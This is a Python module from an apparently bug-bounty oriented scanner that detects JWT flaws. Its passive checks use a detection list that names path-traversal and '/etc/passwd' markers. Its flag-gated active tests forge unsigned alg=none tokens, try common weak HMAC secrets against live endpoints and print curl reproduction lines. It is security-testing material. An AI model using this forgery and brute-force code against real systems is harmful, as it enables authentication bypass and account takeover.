# detectors/jwt_detector.py
"""
JWT/Token Manipulation Detector - Critical authentication bypass vulnerabilities

Tests for:
- Algorithm confusion (HS256 → none, HS256 → RS256)
- Weak secret brute force (common secrets)
- 'kid' parameter injection (SQL/Path traversal in JWT header)
- 'jku'/'jwk' parameter manipulation (remote key injection)
- Token leakage in URLs/logs
- Missing signature validation
- JWT in GET parameters
- Timing attacks on signature validation

Expected Bounty Value: $1,000-$10,000 per finding (CRITICAL - Account Takeover!)
Common in: Authentication systems, API gateways, SaaS platforms
"""
import logging
import json
import base64
import hashlib
import hmac
import re
from urllib.parse import urlparse
from detectors.registry import register_passive, register_active, await_host_token

logger = logging.getLogger(__name__)

# Common weak JWT secrets (top 100)
WEAK_SECRETS = [
    "secret",
    "password",
    "123456",
    "admin",
    "test",
    "secret123",
    "password123",
    "mySecret",
    "jwt_secret",
    "your-256-bit-secret",
    "your-secret",
    "secret_key",
    "secretKey",
    "supersecret",
    "mysecretkey",
    "changeMe",
    "changeme",
    "default",
    "qwerty",
    "abc123",
    "letmein",
    "trustno1",
    "monkey",
    "dragon",
    "master",
    "password1",
    "123456789",
    "12345678",
    "1234567890",
    "football",
]


def decode_jwt_nosig(token):
    """Decode JWT without signature verification."""
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return None, None

        # Decode header
        header_b64 = parts[0]
        # Add padding if needed
        header_b64 += '=' * (4 - len(header_b64) % 4)
        header = json.loads(base64.urlsafe_b64decode(header_b64))

        # Decode payload
        payload_b64 = parts[1]
        payload_b64 += '=' * (4 - len(payload_b64) % 4)
        payload = json.loads(base64.urlsafe_b64decode(payload_b64))

        return header, payload

    except Exception as e:
        logger.debug(f"JWT decode error: {e}")
        return None, None


def encode_jwt_unsigned(header, payload):
    """Create unsigned JWT (alg=none)."""
    try:
        # Encode header
        header_str = json.dumps(header, separators=(',', ':'))
        header_b64 = base64.urlsafe_b64encode(header_str.encode()).rstrip(b'=').decode()

        # Encode payload
        payload_str = json.dumps(payload, separators=(',', ':'))
        payload_b64 = base64.urlsafe_b64encode(payload_str.encode()).rstrip(b'=').decode()

        # No signature for alg=none
        return f"{header_b64}.{payload_b64}."

    except Exception as e:
        logger.debug(f"JWT encode error: {e}")
        return None


def sign_jwt_hmac(header, payload, secret):
    """Sign JWT with HMAC (HS256)."""
    try:
        # Encode header and payload
        header_str = json.dumps(header, separators=(',', ':'))
        header_b64 = base64.urlsafe_b64encode(header_str.encode()).rstrip(b'=').decode()

        payload_str = json.dumps(payload, separators=(',', ':'))
        payload_b64 = base64.urlsafe_b64encode(payload_str.encode()).rstrip(b'=').decode()

        # Create signature
        message = f"{header_b64}.{payload_b64}"
        signature = hmac.new(
            secret.encode(),
            message.encode(),
            hashlib.sha256
        ).digest()
        signature_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()

        return f"{header_b64}.{payload_b64}.{signature_b64}"

    except Exception as e:
        logger.debug(f"JWT signing error: {e}")
        return None


@register_passive
def jwt_detector_passive(text, combined_dict):
    """
    Passive JWT detection - find JWTs in responses, URLs, headers.
    """
    findings = []

    try:
        url = combined_dict["url"]
        context = combined_dict["context"]

        resp = context.get("resp")
        if not resp:
            return findings

        body = context.get("body", text)
        headers = context.get("headers", {})

        # JWT regex pattern (3 base64url parts separated by dots)
        jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'

        # Check response body for JWTs
        body_jwts = re.findall(jwt_pattern, body)

        # Check URL for JWTs (BAD PRACTICE!)
        url_jwts = re.findall(jwt_pattern, url)

        # Check Authorization header
        auth_header = headers.get("authorization", "") or headers.get("Authorization", "")
        header_jwts = re.findall(jwt_pattern, auth_header)

        all_jwts = list(set(body_jwts + url_jwts + header_jwts))

        for token in all_jwts:
            header, payload = decode_jwt_nosig(token)

            if not header or not payload:
                continue

            # Check 1: JWT in URL (HIGH severity - token leakage)
            if token in url:
                findings.append({
                    "type": "JWT Token in URL",
                    "severity": "high",
                    "evidence": f"JWT found in URL: {url[:100]}...",
                    "how_found": "JWT token detected in URL query string",
                    "evidence_url": url,
                    "payload": token[:50] + "...",
                    "jwt_header": str(header),
                    "jwt_payload": str(payload),
                    "impact": "JWT in URL can leak via browser history, proxy logs, Referer header, or server logs. Enables account takeover.",
                    "remediation": "Use Authorization header (Bearer token) instead of URL parameters",
                    "cve_reference": "CWE-598: Use of GET Request Method With Sensitive Query Strings",
                })

                logger.warning(f"🔥 HIGH: JWT in URL detected: {url[:100]}")

            # Check 2: Algorithm=none (CRITICAL - no signature!)
            alg = header.get("alg", "").lower()
            if alg == "none":
                findings.append({
                    "type": "JWT Algorithm None",
                    "severity": "critical",
                    "evidence": f"JWT uses alg=none (no signature validation)",
                    "how_found": "JWT header contains 'alg': 'none'",
                    "evidence_url": url,
                    "jwt_header": str(header),
                    "jwt_payload": str(payload),
                    "impact": "CRITICAL: JWT has no signature. Attacker can forge any token and impersonate any user.",
                    "remediation": "Never accept alg=none. Always validate JWT signatures.",
                    "cve_reference": "CWE-347: Improper Verification of Cryptographic Signature",
                })

                logger.warning(f"🔥 CRITICAL: JWT with alg=none detected!")

            # Check 3: Weak algorithm (HS256 vs RS256)
            if alg in ["hs256", "hs384", "hs512"]:
                findings.append({
                    "type": "JWT Uses Symmetric Algorithm",
                    "severity": "low",
                    "evidence": f"JWT uses symmetric algorithm: {alg.upper()}",
                    "how_found": f"JWT header contains 'alg': '{alg.upper()}'",
                    "evidence_url": url,
                    "jwt_header": str(header),
                    "jwt_payload": str(payload),
                    "impact": "Symmetric algorithms (HS256) vulnerable to weak secret brute force and algorithm confusion attacks",
                    "remediation": "Use asymmetric algorithms (RS256, ES256) for better security",
                })

            # Check 4: Suspicious 'kid' parameter (SQL injection, path traversal)
            if "kid" in header:
                kid = str(header["kid"])
                suspicious_patterns = [
                    "../", "..\\",  # Path traversal
                    "'", '"',  # SQL injection
                    "../../",  # Multiple traversal
                    "/etc/passwd",  # LFI
                    "C:\\",  # Windows paths
                ]

                if any(pattern in kid for pattern in suspicious_patterns):
                    findings.append({
                        "type": "JWT Suspicious 'kid' Parameter",
                        "severity": "medium",
                        "evidence": f"JWT 'kid' contains suspicious pattern: {kid}",
                        "how_found": "JWT header 'kid' parameter contains traversal/injection characters",
                        "evidence_url": url,
                        "jwt_header": str(header),
                        "jwt_payload": str(payload),
                        "impact": "'kid' parameter may be vulnerable to SQL injection or path traversal",
                        "remediation": "Validate and sanitize 'kid' parameter. Use whitelist of allowed key IDs.",
                    })

            # Check 5: 'jku' or 'jwk' parameter (remote key injection)
            if "jku" in header or "jwk" in header:
                findings.append({
                    "type": "JWT Remote Key Parameters",
                    "severity": "high",
                    "evidence": f"JWT contains 'jku' or 'jwk' parameter: {header}",
                    "how_found": "JWT header contains 'jku' (JWK Set URL) or 'jwk' (Embedded JWK)",
                    "evidence_url": url,
                    "jwt_header": str(header),
                    "jwt_payload": str(payload),
                    "impact": "Attacker can provide their own signing key via 'jku'/'jwk' parameters, bypassing signature validation",
                    "remediation": "Disable 'jku' and 'jwk' parameters. Use only trusted key sources.",
                    "cve_reference": "CWE-347: Improper Verification of Cryptographic Signature",
                })

                logger.warning(f"🔥 HIGH: JWT with jku/jwk parameter detected!")

            # Check 6: Sensitive data in payload
            sensitive_keys = ["password", "secret", "api_key", "private_key", "ssn", "credit_card"]
            for key in payload.keys():
                if any(sensitive in key.lower() for sensitive in sensitive_keys):
                    findings.append({
                        "type": "JWT Contains Sensitive Data",
                        "severity": "medium",
                        "evidence": f"JWT payload contains sensitive key: {key}",
                        "how_found": f"JWT payload has key '{key}' which may contain sensitive data",
                        "evidence_url": url,
                        "jwt_payload": str(payload),
                        "impact": "JWTs are encoded (not encrypted) and can be decoded by anyone. Sensitive data is exposed.",
                        "remediation": "Never store sensitive data in JWT payloads. Use encrypted tokens if needed.",
                    })

    except Exception as e:
        logger.exception(f"jwt_detector_passive error for {url}: {e}")

    return findings


@register_active
async def jwt_detector_active(session, url, context):
    """
    Active JWT manipulation - test algorithm confusion and weak secrets.

    Only runs if --allow-destructive flag is set.
    """
    findings = []

    allow_destructive = context.get("allow_destructive", False)
    if not allow_destructive:
        return findings

    try:
        resp = context.get("resp")
        if not resp:
            return findings

        headers = context.get("headers", {})
        per_host_rate = context.get("per_host_rate", None)

        parsed = urlparse(url)
        host = parsed.netloc.lower()

        # Get JWT from Authorization header or cookies
        auth_header = headers.get("authorization", "") or headers.get("Authorization", "")

        jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
        jwt_match = re.search(jwt_pattern, auth_header)

        if not jwt_match:
            return findings

        original_token = jwt_match.group(0)
        header, payload = decode_jwt_nosig(original_token)

        if not header or not payload:
            return findings

        logger.info(f"🔍 Testing JWT manipulation on {url}")

        # Test 1: Algorithm confusion (HS256 → none)
        logger.info(f"🔍 Testing alg=none bypass")
        await await_host_token(host, per_host_rate)

        try:
            # Create unsigned token (alg=none)
            none_header = header.copy()
            none_header["alg"] = "none"
            none_token = encode_jwt_unsigned(none_header, payload)

            if none_token:
                # Test with modified token
                test_headers = {
                    "Authorization": f"Bearer {none_token}",
                    "Content-Type": "application/json"
                }

                async with session.get(url, headers=test_headers, timeout=10) as resp_test:
                    status = resp_test.status
                    await resp_test.text()

                    # If we get 200 with unsigned token, it's vulnerable!
                    if status == 200 and status == resp.status:
                        findings.append({
                            "type": "JWT Algorithm Confusion (alg=none)",
                            "severity": "critical",
                            "evidence": f"Server accepted JWT with alg=none (unsigned token)",
                            "how_found": "Modified JWT to alg=none, server accepted it without signature verification",
                            "evidence_url": url,
                            "evidence_status": status,
                            "payload": none_token[:50] + "...",
                            "original_token": original_token[:50] + "...",
                            "impact": "CRITICAL: Server doesn't validate JWT signatures. Attacker can forge any token and impersonate any user (full account takeover).",
                            "remediation": "Never accept alg=none. Always validate JWT signatures with proper key verification.",
                            "cve_reference": "CWE-347: Improper Verification of Cryptographic Signature",
                            "repro_command": f"curl -H 'Authorization: Bearer {none_token}' '{url}'",
                        })

                        logger.warning(f"🔥 CRITICAL: JWT alg=none accepted on {url}!")

        except Exception as e:
            logger.debug(f"alg=none test failed: {e}")

        # Test 2: Weak secret brute force (only first 10 secrets for speed)
        alg = header.get("alg", "").upper()
        if alg in ["HS256", "HS384", "HS512"]:
            logger.info(f"🔍 Testing weak JWT secrets")

            for secret in WEAK_SECRETS[:10]:  # Test only first 10
                await await_host_token(host, per_host_rate)

                try:
                    # Try to sign with weak secret
                    weak_header = header.copy()
                    weak_token = sign_jwt_hmac(weak_header, payload, secret)

                    if not weak_token:
                        continue

                    test_headers = {
                        "Authorization": f"Bearer {weak_token}",
                        "Content-Type": "application/json"
                    }

                    async with session.get(url, headers=test_headers, timeout=10) as resp_test:
                        status = resp_test.status

                        # If we get 200 with re-signed token, we found the secret!
                        if status == 200:
                            findings.append({
                                "type": "JWT Weak Secret",
                                "severity": "critical",
                                "evidence": f"JWT signed with weak secret: '{secret}'",
                                "how_found": f"Successfully brute-forced JWT secret: '{secret}'",
                                "evidence_url": url,
                                "evidence_status": status,
                                "weak_secret": secret,
                                "impact": f"CRITICAL: JWT secret is weak ('{secret}'). Attacker can forge valid tokens and impersonate any user.",
                                "remediation": f"Use strong random secret (256+ bits). Current secret '{secret}' is publicly known.",
                                "cve_reference": "CWE-798: Use of Hard-coded Credentials",
                                "repro_command": f"# Use jwt.io or PyJWT to sign with secret: '{secret}'",
                            })

                            logger.warning(f"🔥 CRITICAL: Weak JWT secret found: '{secret}' on {url}!")
                            break  # Found the secret, stop testing

                except Exception as e:
                    logger.debug(f"Weak secret test failed for '{secret}': {e}")

    except Exception as e:
        logger.exception(f"jwt_detector_active error for {url}: {e}")

    return findings
